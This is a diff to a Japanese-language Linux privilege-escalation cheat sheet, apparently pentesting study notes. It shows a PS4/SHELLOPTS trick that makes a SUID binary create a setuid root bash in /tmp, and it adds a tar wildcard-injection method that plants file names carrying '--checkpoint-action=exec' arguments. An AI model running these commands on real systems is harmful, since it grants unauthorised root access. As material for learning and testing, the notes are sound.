@@ -33,6 +33,7 @@ strings [FILE]
 2. システムコール単位での処理の流れから、実行エラーになっているライブラリやファイルなどを確認。
 ```
 strace [FILE]
+strace [FILE] 2>&1 | grep -iE "open|access|no such file"
 ```
 
 ### 権限昇格の実行（コマンドの指定方法ごとに）
@@ -71,6 +72,13 @@ suid-env2をデバッグモードで実行する。Bashをデバッグモード�
 ```
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 /tmp/rootbash -p
+```
+
+4. ワイルドカードの使用を確認  
+tarコマンドなどの引数として*を使用し、かつ実行先のディレクトリに書き込み権限がある場合。touchコマンドの引数には絶対パスを指定しないとエラーになる。
+```
+touch [FILE PATH]--checkpoint=1
+touch [FILE PATH]--checkpoint-action=exec=[PAYLOAD]
 ```
 
 ## sudoの確認
